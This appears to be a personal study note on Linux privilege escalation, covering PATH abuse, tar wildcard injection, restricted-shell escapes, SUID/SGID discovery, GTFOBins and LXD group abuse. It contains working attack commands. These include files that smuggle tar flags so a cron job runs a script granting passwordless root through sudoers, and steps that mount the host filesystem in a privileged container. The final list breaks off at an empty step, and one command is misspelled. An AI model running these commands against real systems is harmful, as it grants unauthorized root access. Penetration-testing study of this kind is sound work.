```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```
> Other [[Privilege Escalation]] page
## Path Abuse
If we can modify a user's path, we could potentially run a malicious version of a binary if it is found earlier in the path. eg. `export PATH=.:${PATH}` will add the current directory.

## Wildcard Abuse
| Character | Significance                                                                                            |
| --------- | ------------------------------------------------------------------------------------------------------- |
| `*`       | Matches any number of characters in a file name                                                         |
| `?`       | Matches a single character                                                                              |
| `[ ]`     | Brackets enclose characters and can match any single one at the defined position                        |
| `~`       | Expands to the user's home directory or can have another username appended to refer to that user's home |
| `-`       | A hyphen within brackets will denote a range of characters                                              |
### Tar flags example
If we find a backup cron job (that runs every minute) that does something like:
```bash
*/01 * * * * cd /home/some-user && tar -zcf /home/some-user/backup.tar.gz *
```
We can abuse the `*` wildcard here by creating files with names of the CLI flags.
```bash
$ echo 'echo "some-user ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
$ echo "" > "--checkpoint-action=exec=sh root.sh"
$ echo "" > "--checkpoint=1"
```

## Escaping Restricted Shells
Restricted shells limit a user's ability to execute commands. They can limit what commands can be run and in what directories. Some examples include `rbash`, `rksh`, `rzsh` in linux and the `Restricted-access Shell` in windows.

Sometimes there are vectors we can use in these shells to run arbitrary commands and escape the shell. For examples:
Suppose a shell limits us to `ls -l`, we might be able to execute commands as arguments `ls -l $(pwd)`.

We could use features like *command substitution (using backticks)*, *command chaining (`;` `|`)*, *using environment variables to modify commands*, and *shell functions*.

List available commands with `compgen -c`.

## Special Permissions
### SETUID & SETGID
The `setuid` permissions allows a user to execute something as another user, typically with elevated privileges. This can be seen in `ls` with an `s`.
```bash
-rwsr-xr-x 1 root root 16728 Sep 1 19:06 /home/hr/payroll
```

The `setgid` allows you to run a binary as if you were part of the group that created them. These can all be found with:
```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```
> More info [here](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits)

## GTFOBins
The [GTFOBins](https://gtfobins.github.io/) project is a curated list of binaries and scripts that can be used to bypass security restrictions. Each page details how a binary can be used to:
- Break out of restricted shells
- Elevate privileges
- Spawn reverse shells
- Transfer files

## Privileged Groups
### LXC / LXD
`LXD` is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group, we can abuse this as its a privileged group. We can make a privileged LXD container that mounts the host file system.
1. Ensure you are in the `lxd` group
2. Get a container image eg. Alpine
3. Start LXD : `lxd init` (*this [post](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) can help with this*)
4. Import local image : `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine`
5. Start a privileged container : `lxc init alpine [name] -c security.privileged=true`
6. Mount the host filesystem : `lsx config device add [name] mydev disk source=/ path=/mnt/root recursive=true`
7. 